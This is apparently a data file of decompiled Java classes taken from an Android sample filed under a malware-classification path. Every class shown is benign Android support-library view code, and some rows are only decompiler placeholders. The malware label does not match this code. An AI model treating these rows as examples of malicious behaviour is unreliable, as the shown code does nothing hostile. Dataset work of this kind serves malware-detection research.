"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\BaseScaleGestureDetectorImpl.code","private static class BaseScaleGestureDetectorImpl implements ScaleGestureDetectorImpl {   private BaseScaleGestureDetectorImpl(){   }   @Override public void setQuickScaleEnabled(  Object o,  boolean enabled){   }   @Override public boolean isQuickScaleEnabled(  Object o){     return false;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\BaseVelocityTrackerVersionImpl.code","static class BaseVelocityTrackerVersionImpl implements VelocityTrackerVersionImpl {   BaseVelocityTrackerVersionImpl(){   }   @Override public float getXVelocity(  VelocityTracker tracker,  int pointerId){     return tracker.getXVelocity();   }   @Override public float getYVelocity(  VelocityTracker tracker,  int pointerId){     return tracker.getYVelocity();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\BaseViewCompatImpl.code","static class BaseViewCompatImpl implements ViewCompatImpl {   BaseViewCompatImpl(){   }   @Override public boolean canScrollHorizontally(  View v,  int direction){     return false;   }   @Override public boolean canScrollVertically(  View v,  int direction){     return false;   }   @Override public int getOverScrollMode(  View v){     return 2;   }   @Override public void setOverScrollMode(  View v,  int mode){   }   @Override public void setAccessibilityDelegate(  View v,  AccessibilityDelegateCompat delegate){   }   @Override public void onPopulateAccessibilityEvent(  View v,  AccessibilityEvent event){   }   @Override public void onInitializeAccessibilityEvent(  View v,  AccessibilityEvent event){   }   @Override public void onInitializeAccessibilityNodeInfo(  View v,  AccessibilityNodeInfoCompat info){   }   @Override public boolean hasTransientState(  View view){     return false;   }   @Override public void setHasTransientState(  View view,  boolean hasTransientState){   }   @Override public void postInvalidateOnAnimation(  View view){     view.postInvalidateDelayed(getFrameTime());   }   @Override public void postInvalidateOnAnimation(  View view,  int left,  int top,  int right,  int bottom){     view.postInvalidateDelayed(getFrameTime(),left,top,right,bottom);   }   @Override public void postOnAnimation(  View view,  Runnable action){     view.postDelayed(action,getFrameTime());   }   @Override public void postOnAnimationDelayed(  View view,  Runnable action,  long delayMillis){     view.postDelayed(action,getFrameTime() + delayMillis);   }   long getFrameTime(){     return ViewCompat.FAKE_FRAME_TIME;   }   @Override public int getImportantForAccessibility(  View view){     return 0;   }   @Override public void setImportantForAccessibility(  View view,  int mode){   }   @Override public boolean performAccessibilityAction(  View view,  int action,  Bundle arguments){     return false;   }   @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  View view){     return null;   }   @Override public float getAlpha(  View view){     return 1.0f;   }   @Override public void setLayerType(  View view,  int layerType,  Paint paint){   }   @Override public int getLayerType(  View view){     return 0;   }   @Override public int getLabelFor(  View view){     return 0;   }   @Override public void setLabelFor(  View view,  int id){   }   @Override public void setLayerPaint(  View view,  Paint p){   }   @Override public int getLayoutDirection(  View view){     return 0;   }   @Override public void setLayoutDirection(  View view,  int layoutDirection){   }   @Override public ViewParent getParentForAccessibility(  View view){     return view.getParent();   }   @Override public boolean isOpaque(  View view){     Drawable bg=view.getBackground();     return bg != null && bg.getOpacity() == -1;   }   @Override public int resolveSizeAndState(  int size,  int measureSpec,  int childMeasuredState){     return View.resolveSize(size,measureSpec);   }   @Override public int getMeasuredWidthAndState(  View view){     return view.getMeasuredWidth();   }   @Override public int getMeasuredHeightAndState(  View view){     return view.getMeasuredHeight();   }   @Override public int getMeasuredState(  View view){     return 0;   }   @Override public int getAccessibilityLiveRegion(  View view){     return 0;   }   @Override public void setAccessibilityLiveRegion(  View view,  int mode){   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\BaseViewConfigurationVersionImpl.code","static class BaseViewConfigurationVersionImpl implements ViewConfigurationVersionImpl {   BaseViewConfigurationVersionImpl(){   }   @Override public int getScaledPagingTouchSlop(  ViewConfiguration config){     return config.getScaledTouchSlop();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\Decor.code","interface Decor { } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\EclairKeyEventVersionImpl.code","static class EclairKeyEventVersionImpl extends BaseKeyEventVersionImpl {   EclairKeyEventVersionImpl(){   }   @Override public void startTracking(  KeyEvent event){     KeyEventCompatEclair.startTracking(event);   }   @Override public boolean isTracking(  KeyEvent event){     return KeyEventCompatEclair.isTracking(event);   }   @Override public Object getKeyDispatcherState(  View view){     return KeyEventCompatEclair.getKeyDispatcherState(view);   }   @Override public boolean dispatch(  KeyEvent event,  KeyEvent.Callback receiver,  Object state,  Object target){     return KeyEventCompatEclair.dispatch(event,receiver,state,target);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\EclairMotionEventVersionImpl.code","static class EclairMotionEventVersionImpl implements MotionEventVersionImpl {   EclairMotionEventVersionImpl(){   }   @Override public int findPointerIndex(  MotionEvent event,  int pointerId){     return MotionEventCompatEclair.findPointerIndex(event,pointerId);   }   @Override public int getPointerId(  MotionEvent event,  int pointerIndex){     return MotionEventCompatEclair.getPointerId(event,pointerIndex);   }   @Override public float getX(  MotionEvent event,  int pointerIndex){     return MotionEventCompatEclair.getX(event,pointerIndex);   }   @Override public float getY(  MotionEvent event,  int pointerIndex){     return MotionEventCompatEclair.getY(event,pointerIndex);   }   @Override public int getPointerCount(  MotionEvent event){     return MotionEventCompatEclair.getPointerCount(event);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\EclairMr1ViewCompatImpl.code","static class EclairMr1ViewCompatImpl extends BaseViewCompatImpl {   EclairMr1ViewCompatImpl(){   }   @Override public boolean isOpaque(  View view){     return ViewCompatEclairMr1.isOpaque(view);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\FroyoViewConfigurationVersionImpl.code","static class FroyoViewConfigurationVersionImpl implements ViewConfigurationVersionImpl {   FroyoViewConfigurationVersionImpl(){   }   @Override public int getScaledPagingTouchSlop(  ViewConfiguration config){     return ViewConfigurationCompatFroyo.getScaledPagingTouchSlop(config);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\GBViewCompatImpl.code","static class GBViewCompatImpl extends EclairMr1ViewCompatImpl {   GBViewCompatImpl(){   }   @Override public int getOverScrollMode(  View v){     return ViewCompatGingerbread.getOverScrollMode(v);   }   @Override public void setOverScrollMode(  View v,  int mode){     ViewCompatGingerbread.setOverScrollMode(v,mode);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\GestureDetectorCompat.code","!org.eclipse.jdt.core.dom.TypeDeclaration@35e86dd7"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\GestureDetectorCompatImpl.code","interface GestureDetectorCompatImpl {   boolean isLongpressEnabled();   boolean onTouchEvent(  MotionEvent motionEvent);   void setIsLongpressEnabled(  boolean z);   void setOnDoubleTapListener(  GestureDetector.OnDoubleTapListener onDoubleTapListener); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\GestureDetectorCompatImplBase.code","!org.eclipse.jdt.core.dom.TypeDeclaration@108097fc"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\GestureDetectorCompatImplJellybeanMr2.code","static class GestureDetectorCompatImplJellybeanMr2 implements GestureDetectorCompatImpl {   private final GestureDetector mDetector;   public GestureDetectorCompatImplJellybeanMr2(  Context context,  GestureDetector.OnGestureListener listener,  Handler handler){     this.mDetector=new GestureDetector(context,listener,handler);   }   @Override public boolean isLongpressEnabled(){     return this.mDetector.isLongpressEnabled();   }   @Override public boolean onTouchEvent(  MotionEvent ev){     return this.mDetector.onTouchEvent(ev);   }   @Override public void setIsLongpressEnabled(  boolean enabled){     this.mDetector.setIsLongpressEnabled(enabled);   }   @Override public void setOnDoubleTapListener(  GestureDetector.OnDoubleTapListener listener){     this.mDetector.setOnDoubleTapListener(listener);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\GestureHandler.code","!org.eclipse.jdt.core.dom.TypeDeclaration@1bfd0822"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\GravityCompat.code","public class GravityCompat {   public static final int END=8388613;   static final GravityCompatImpl IMPL;   public static final int RELATIVE_HORIZONTAL_GRAVITY_MASK=8388615;   public static final int RELATIVE_LAYOUT_DIRECTION=8388608;   public static final int START=8388611; interface GravityCompatImpl {     void apply(    int i,    int i2,    int i3,    Rect rect,    int i4,    int i5,    Rect rect2,    int i6);     void apply(    int i,    int i2,    int i3,    Rect rect,    Rect rect2,    int i4);     void applyDisplay(    int i,    Rect rect,    Rect rect2,    int i2);     int getAbsoluteGravity(    int i,    int i2);   } static class GravityCompatImplBase implements GravityCompatImpl {     GravityCompatImplBase(){     }     @Override public int getAbsoluteGravity(    int gravity,    int layoutDirection){       return (-8388609) & gravity;     }     @Override public void apply(    int gravity,    int w,    int h,    Rect container,    Rect outRect,    int layoutDirection){       Gravity.apply(gravity,w,h,container,outRect);     }     @Override public void apply(    int gravity,    int w,    int h,    Rect container,    int xAdj,    int yAdj,    Rect outRect,    int layoutDirection){       Gravity.apply(gravity,w,h,container,xAdj,yAdj,outRect);     }     @Override public void applyDisplay(    int gravity,    Rect display,    Rect inoutObj,    int layoutDirection){       Gravity.applyDisplay(gravity,display,inoutObj);     }   } static class GravityCompatImplJellybeanMr1 implements GravityCompatImpl {     GravityCompatImplJellybeanMr1(){     }     @Override public int getAbsoluteGravity(    int gravity,    int layoutDirection){       return GravityCompatJellybeanMr1.getAbsoluteGravity(gravity,layoutDirection);     }     @Override public void apply(    int gravity,    int w,    int h,    Rect container,    Rect outRect,    int layoutDirection){       GravityCompatJellybeanMr1.apply(gravity,w,h,container,outRect,layoutDirection);     }     @Override public void apply(    int gravity,    int w,    int h,    Rect container,    int xAdj,    int yAdj,    Rect outRect,    int layoutDirection){       GravityCompatJellybeanMr1.apply(gravity,w,h,container,xAdj,yAdj,outRect,layoutDirection);     }     @Override public void applyDisplay(    int gravity,    Rect display,    Rect inoutObj,    int layoutDirection){       GravityCompatJellybeanMr1.applyDisplay(gravity,display,inoutObj,layoutDirection);     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 17) {       IMPL=new GravityCompatImplJellybeanMr1();     }  else {       IMPL=new GravityCompatImplBase();     }   }   public static void apply(  int gravity,  int w,  int h,  Rect container,  Rect outRect,  int layoutDirection){     IMPL.apply(gravity,w,h,container,outRect,layoutDirection);   }   public static void apply(  int gravity,  int w,  int h,  Rect container,  int xAdj,  int yAdj,  Rect outRect,  int layoutDirection){     IMPL.apply(gravity,w,h,container,xAdj,yAdj,outRect,layoutDirection);   }   public static void applyDisplay(  int gravity,  Rect display,  Rect inoutObj,  int layoutDirection){     IMPL.applyDisplay(gravity,display,inoutObj,layoutDirection);   }   public static int getAbsoluteGravity(  int gravity,  int layoutDirection){     return IMPL.getAbsoluteGravity(gravity,layoutDirection);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\GravityCompatImpl.code","interface GravityCompatImpl {   void apply(  int i,  int i2,  int i3,  Rect rect,  int i4,  int i5,  Rect rect2,  int i6);   void apply(  int i,  int i2,  int i3,  Rect rect,  Rect rect2,  int i4);   void applyDisplay(  int i,  Rect rect,  Rect rect2,  int i2);   int getAbsoluteGravity(  int i,  int i2); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\GravityCompatImplBase.code","static class GravityCompatImplBase implements GravityCompatImpl {   GravityCompatImplBase(){   }   @Override public int getAbsoluteGravity(  int gravity,  int layoutDirection){     return (-8388609) & gravity;   }   @Override public void apply(  int gravity,  int w,  int h,  Rect container,  Rect outRect,  int layoutDirection){     Gravity.apply(gravity,w,h,container,outRect);   }   @Override public void apply(  int gravity,  int w,  int h,  Rect container,  int xAdj,  int yAdj,  Rect outRect,  int layoutDirection){     Gravity.apply(gravity,w,h,container,xAdj,yAdj,outRect);   }   @Override public void applyDisplay(  int gravity,  Rect display,  Rect inoutObj,  int layoutDirection){     Gravity.applyDisplay(gravity,display,inoutObj);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\GravityCompatImplJellybeanMr1.code","static class GravityCompatImplJellybeanMr1 implements GravityCompatImpl {   GravityCompatImplJellybeanMr1(){   }   @Override public int getAbsoluteGravity(  int gravity,  int layoutDirection){     return GravityCompatJellybeanMr1.getAbsoluteGravity(gravity,layoutDirection);   }   @Override public void apply(  int gravity,  int w,  int h,  Rect container,  Rect outRect,  int layoutDirection){     GravityCompatJellybeanMr1.apply(gravity,w,h,container,outRect,layoutDirection);   }   @Override public void apply(  int gravity,  int w,  int h,  Rect container,  int xAdj,  int yAdj,  Rect outRect,  int layoutDirection){     GravityCompatJellybeanMr1.apply(gravity,w,h,container,xAdj,yAdj,outRect,layoutDirection);   }   @Override public void applyDisplay(  int gravity,  Rect display,  Rect inoutObj,  int layoutDirection){     GravityCompatJellybeanMr1.applyDisplay(gravity,display,inoutObj,layoutDirection);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\GravityCompatJellybeanMr1.code","class GravityCompatJellybeanMr1 {   GravityCompatJellybeanMr1(){   }   public static int getAbsoluteGravity(  int gravity,  int layoutDirection){     return Gravity.getAbsoluteGravity(gravity,layoutDirection);   }   public static void apply(  int gravity,  int w,  int h,  Rect container,  Rect outRect,  int layoutDirection){     Gravity.apply(gravity,w,h,container,outRect,layoutDirection);   }   public static void apply(  int gravity,  int w,  int h,  Rect container,  int xAdj,  int yAdj,  Rect outRect,  int layoutDirection){     Gravity.apply(gravity,w,h,container,xAdj,yAdj,outRect,layoutDirection);   }   public static void applyDisplay(  int gravity,  Rect display,  Rect inoutObj,  int layoutDirection){     Gravity.applyDisplay(gravity,display,inoutObj,layoutDirection);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\HCViewCompatImpl.code","static class HCViewCompatImpl extends GBViewCompatImpl {   HCViewCompatImpl(){   }   @Override long getFrameTime(){     return ViewCompatHC.getFrameTime();   }   @Override public float getAlpha(  View view){     return ViewCompatHC.getAlpha(view);   }   @Override public void setLayerType(  View view,  int layerType,  Paint paint){     ViewCompatHC.setLayerType(view,layerType,paint);   }   @Override public int getLayerType(  View view){     return ViewCompatHC.getLayerType(view);   }   @Override public void setLayerPaint(  View view,  Paint paint){     setLayerType(view,getLayerType(view),paint);     view.invalidate();   }   @Override public int resolveSizeAndState(  int size,  int measureSpec,  int childMeasuredState){     return ViewCompatHC.resolveSizeAndState(size,measureSpec,childMeasuredState);   }   @Override public int getMeasuredWidthAndState(  View view){     return ViewCompatHC.getMeasuredWidthAndState(view);   }   @Override public int getMeasuredHeightAndState(  View view){     return ViewCompatHC.getMeasuredHeightAndState(view);   }   @Override public int getMeasuredState(  View view){     return ViewCompatHC.getMeasuredState(view);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\HoneycombKeyEventVersionImpl.code","static class HoneycombKeyEventVersionImpl extends EclairKeyEventVersionImpl {   HoneycombKeyEventVersionImpl(){   }   @Override public int normalizeMetaState(  int metaState){     return KeyEventCompatHoneycomb.normalizeMetaState(metaState);   }   @Override public boolean metaStateHasModifiers(  int metaState,  int modifiers){     return KeyEventCompatHoneycomb.metaStateHasModifiers(metaState,modifiers);   }   @Override public boolean metaStateHasNoModifiers(  int metaState){     return KeyEventCompatHoneycomb.metaStateHasNoModifiers(metaState);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\HoneycombMenuVersionImpl.code","static class HoneycombMenuVersionImpl implements MenuVersionImpl {   HoneycombMenuVersionImpl(){   }   @Override public void setShowAsAction(  MenuItem item,  int actionEnum){     MenuItemCompatHoneycomb.setShowAsAction(item,actionEnum);   }   @Override public MenuItem setActionView(  MenuItem item,  View view){     return MenuItemCompatHoneycomb.setActionView(item,view);   }   @Override public MenuItem setActionView(  MenuItem item,  int resId){     return MenuItemCompatHoneycomb.setActionView(item,resId);   }   @Override public View getActionView(  MenuItem item){     return MenuItemCompatHoneycomb.getActionView(item);   }   @Override public boolean expandActionView(  MenuItem item){     return false;   }   @Override public boolean collapseActionView(  MenuItem item){     return false;   }   @Override public boolean isActionViewExpanded(  MenuItem item){     return false;   }   @Override public MenuItem setOnActionExpandListener(  MenuItem item,  OnActionExpandListener listener){     return item;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\HoneycombVelocityTrackerVersionImpl.code","static class HoneycombVelocityTrackerVersionImpl implements VelocityTrackerVersionImpl {   HoneycombVelocityTrackerVersionImpl(){   }   @Override public float getXVelocity(  VelocityTracker tracker,  int pointerId){     return VelocityTrackerCompatHoneycomb.getXVelocity(tracker,pointerId);   }   @Override public float getYVelocity(  VelocityTracker tracker,  int pointerId){     return VelocityTrackerCompatHoneycomb.getYVelocity(tracker,pointerId);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\IcsMenuVersionImpl.code","static class IcsMenuVersionImpl extends HoneycombMenuVersionImpl {   IcsMenuVersionImpl(){   }   @Override public boolean expandActionView(  MenuItem item){     return MenuItemCompatIcs.expandActionView(item);   }   @Override public boolean collapseActionView(  MenuItem item){     return MenuItemCompatIcs.collapseActionView(item);   }   @Override public boolean isActionViewExpanded(  MenuItem item){     return MenuItemCompatIcs.isActionViewExpanded(item);   }   @Override public MenuItem setOnActionExpandListener(  MenuItem item,  final OnActionExpandListener listener){     return listener == null ? MenuItemCompatIcs.setOnActionExpandListener(item,null) : MenuItemCompatIcs.setOnActionExpandListener(item,new MenuItemCompatIcs.SupportActionExpandProxy(){       @Override public boolean onMenuItemActionExpand(      MenuItem item2){         return listener.onMenuItemActionExpand(item2);       }       @Override public boolean onMenuItemActionCollapse(      MenuItem item2){         return listener.onMenuItemActionCollapse(item2);       }     } );   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\ICSViewCompatImpl.code","static class ICSViewCompatImpl extends HCViewCompatImpl {   ICSViewCompatImpl(){   }   @Override public boolean canScrollHorizontally(  View v,  int direction){     return ViewCompatICS.canScrollHorizontally(v,direction);   }   @Override public boolean canScrollVertically(  View v,  int direction){     return ViewCompatICS.canScrollVertically(v,direction);   }   @Override public void onPopulateAccessibilityEvent(  View v,  AccessibilityEvent event){     ViewCompatICS.onPopulateAccessibilityEvent(v,event);   }   @Override public void onInitializeAccessibilityEvent(  View v,  AccessibilityEvent event){     ViewCompatICS.onInitializeAccessibilityEvent(v,event);   }   @Override public void onInitializeAccessibilityNodeInfo(  View v,  AccessibilityNodeInfoCompat info){     ViewCompatICS.onInitializeAccessibilityNodeInfo(v,info.getInfo());   }   @Override public void setAccessibilityDelegate(  View v,  AccessibilityDelegateCompat delegate){     ViewCompatICS.setAccessibilityDelegate(v,delegate.getBridge());   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\ItemInfo.code","public static class ItemInfo {   Object object;   float offset;   int position;   boolean scrolling;   float widthFactor;   ItemInfo(){   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\JbMr1ViewCompatImpl.code","static class JbMr1ViewCompatImpl extends JBViewCompatImpl {   JbMr1ViewCompatImpl(){   }   @Override public int getLabelFor(  View view){     return ViewCompatJellybeanMr1.getLabelFor(view);   }   @Override public void setLabelFor(  View view,  int id){     ViewCompatJellybeanMr1.setLabelFor(view,id);   }   @Override public void setLayerPaint(  View view,  Paint paint){     ViewCompatJellybeanMr1.setLayerPaint(view,paint);   }   @Override public int getLayoutDirection(  View view){     return ViewCompatJellybeanMr1.getLayoutDirection(view);   }   @Override public void setLayoutDirection(  View view,  int layoutDirection){     ViewCompatJellybeanMr1.setLayoutDirection(view,layoutDirection);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\JBViewCompatImpl.code","static class JBViewCompatImpl extends ICSViewCompatImpl {   JBViewCompatImpl(){   }   @Override public boolean hasTransientState(  View view){     return ViewCompatJB.hasTransientState(view);   }   @Override public void setHasTransientState(  View view,  boolean hasTransientState){     ViewCompatJB.setHasTransientState(view,hasTransientState);   }   @Override public void postInvalidateOnAnimation(  View view){     ViewCompatJB.postInvalidateOnAnimation(view);   }   @Override public void postInvalidateOnAnimation(  View view,  int left,  int top,  int right,  int bottom){     ViewCompatJB.postInvalidateOnAnimation(view,left,top,right,bottom);   }   @Override public void postOnAnimation(  View view,  Runnable action){     ViewCompatJB.postOnAnimation(view,action);   }   @Override public void postOnAnimationDelayed(  View view,  Runnable action,  long delayMillis){     ViewCompatJB.postOnAnimationDelayed(view,action,delayMillis);   }   @Override public int getImportantForAccessibility(  View view){     return ViewCompatJB.getImportantForAccessibility(view);   }   @Override public void setImportantForAccessibility(  View view,  int mode){     ViewCompatJB.setImportantForAccessibility(view,mode);   }   @Override public boolean performAccessibilityAction(  View view,  int action,  Bundle arguments){     return ViewCompatJB.performAccessibilityAction(view,action,arguments);   }   @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  View view){     Object compat=ViewCompatJB.getAccessibilityNodeProvider(view);     if (compat != null) {       return new AccessibilityNodeProviderCompat(compat);     }     return null;   }   @Override public ViewParent getParentForAccessibility(  View view){     return ViewCompatJB.getParentForAccessibility(view);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\KeyEventCompat.code","public class KeyEventCompat {   static final KeyEventVersionImpl IMPL; interface KeyEventVersionImpl {     boolean dispatch(    KeyEvent keyEvent,    KeyEvent.Callback callback,    Object obj,    Object obj2);     Object getKeyDispatcherState(    View view);     boolean isTracking(    KeyEvent keyEvent);     boolean metaStateHasModifiers(    int i,    int i2);     boolean metaStateHasNoModifiers(    int i);     int normalizeMetaState(    int i);     void startTracking(    KeyEvent keyEvent);   } static class BaseKeyEventVersionImpl implements KeyEventVersionImpl {     private static final int META_ALL_MASK=247;     private static final int META_MODIFIER_MASK=247;     BaseKeyEventVersionImpl(){     }     private static int metaStateFilterDirectionalModifiers(    int metaState,    int modifiers,    int basic,    int left,    int right){       boolean wantBasic=(modifiers & basic) != 0;       int directional=left | right;       boolean wantLeftOrRight=(modifiers & directional) != 0;       if (wantBasic) {         if (wantLeftOrRight) {           throw new IllegalArgumentException(""bad arguments"");         }         return metaState & (directional ^ (-1));       }       if (wantLeftOrRight) {         return metaState & (basic ^ (-1));       }       return metaState;     }     @Override public int normalizeMetaState(    int metaState){       if ((metaState & 192) != 0) {         metaState|=1;       }       if ((metaState & 48) != 0) {         metaState|=2;       }       return metaState & 247;     }     @Override public boolean metaStateHasModifiers(    int metaState,    int modifiers){       return metaStateFilterDirectionalModifiers(metaStateFilterDirectionalModifiers(normalizeMetaState(metaState) & 247,modifiers,1,64,128),modifiers,2,16,32) == modifiers;     }     @Override public boolean metaStateHasNoModifiers(    int metaState){       return (normalizeMetaState(metaState) & 247) == 0;     }     @Override public void startTracking(    KeyEvent event){     }     @Override public boolean isTracking(    KeyEvent event){       return false;     }     @Override public Object getKeyDispatcherState(    View view){       return null;     }     @Override public boolean dispatch(    KeyEvent event,    KeyEvent.Callback receiver,    Object state,    Object target){       return event.dispatch(receiver);     }   } static class EclairKeyEventVersionImpl extends BaseKeyEventVersionImpl {     EclairKeyEventVersionImpl(){     }     @Override public void startTracking(    KeyEvent event){       KeyEventCompatEclair.startTracking(event);     }     @Override public boolean isTracking(    KeyEvent event){       return KeyEventCompatEclair.isTracking(event);     }     @Override public Object getKeyDispatcherState(    View view){       return KeyEventCompatEclair.getKeyDispatcherState(view);     }     @Override public boolean dispatch(    KeyEvent event,    KeyEvent.Callback receiver,    Object state,    Object target){       return KeyEventCompatEclair.dispatch(event,receiver,state,target);     }   } static class HoneycombKeyEventVersionImpl extends EclairKeyEventVersionImpl {     HoneycombKeyEventVersionImpl(){     }     @Override public int normalizeMetaState(    int metaState){       return KeyEventCompatHoneycomb.normalizeMetaState(metaState);     }     @Override public boolean metaStateHasModifiers(    int metaState,    int modifiers){       return KeyEventCompatHoneycomb.metaStateHasModifiers(metaState,modifiers);     }     @Override public boolean metaStateHasNoModifiers(    int metaState){       return KeyEventCompatHoneycomb.metaStateHasNoModifiers(metaState);     }   } static {     if (Build.VERSION.SDK_INT >= 11) {       IMPL=new HoneycombKeyEventVersionImpl();     }  else {       IMPL=new BaseKeyEventVersionImpl();     }   }   public static int normalizeMetaState(  int metaState){     return IMPL.normalizeMetaState(metaState);   }   public static boolean metaStateHasModifiers(  int metaState,  int modifiers){     return IMPL.metaStateHasModifiers(metaState,modifiers);   }   public static boolean metaStateHasNoModifiers(  int metaState){     return IMPL.metaStateHasNoModifiers(metaState);   }   public static boolean hasModifiers(  KeyEvent event,  int modifiers){     return IMPL.metaStateHasModifiers(event.getMetaState(),modifiers);   }   public static boolean hasNoModifiers(  KeyEvent event){     return IMPL.metaStateHasNoModifiers(event.getMetaState());   }   public static void startTracking(  KeyEvent event){     IMPL.startTracking(event);   }   public static boolean isTracking(  KeyEvent event){     return IMPL.isTracking(event);   }   public static Object getKeyDispatcherState(  View view){     return IMPL.getKeyDispatcherState(view);   }   public static boolean dispatch(  KeyEvent event,  KeyEvent.Callback receiver,  Object state,  Object target){     return IMPL.dispatch(event,receiver,state,target);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\KeyEventCompatEclair.code","class KeyEventCompatEclair {   KeyEventCompatEclair(){   }   public static Object getKeyDispatcherState(  View view){     return view.getKeyDispatcherState();   }   public static boolean dispatch(  KeyEvent event,  KeyEvent.Callback receiver,  Object state,  Object target){     return event.dispatch(receiver,(KeyEvent.DispatcherState)state,target);   }   public static void startTracking(  KeyEvent event){     event.startTracking();   }   public static boolean isTracking(  KeyEvent event){     return event.isTracking();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\KeyEventCompatHoneycomb.code","class KeyEventCompatHoneycomb {   KeyEventCompatHoneycomb(){   }   public static int normalizeMetaState(  int metaState){     return KeyEvent.normalizeMetaState(metaState);   }   public static boolean metaStateHasModifiers(  int metaState,  int modifiers){     return KeyEvent.metaStateHasModifiers(metaState,modifiers);   }   public static boolean metaStateHasNoModifiers(  int metaState){     return KeyEvent.metaStateHasNoModifiers(metaState);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\KeyEventVersionImpl.code","interface KeyEventVersionImpl {   boolean dispatch(  KeyEvent keyEvent,  KeyEvent.Callback callback,  Object obj,  Object obj2);   Object getKeyDispatcherState(  View view);   boolean isTracking(  KeyEvent keyEvent);   boolean metaStateHasModifiers(  int i,  int i2);   boolean metaStateHasNoModifiers(  int i);   int normalizeMetaState(  int i);   void startTracking(  KeyEvent keyEvent); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\KitKatViewCompatImpl.code","static class KitKatViewCompatImpl extends JbMr1ViewCompatImpl {   KitKatViewCompatImpl(){   }   @Override public int getAccessibilityLiveRegion(  View view){     return ViewCompatKitKat.getAccessibilityLiveRegion(view);   }   @Override public void setAccessibilityLiveRegion(  View view,  int mode){     ViewCompatKitKat.setAccessibilityLiveRegion(view,mode);   } } "
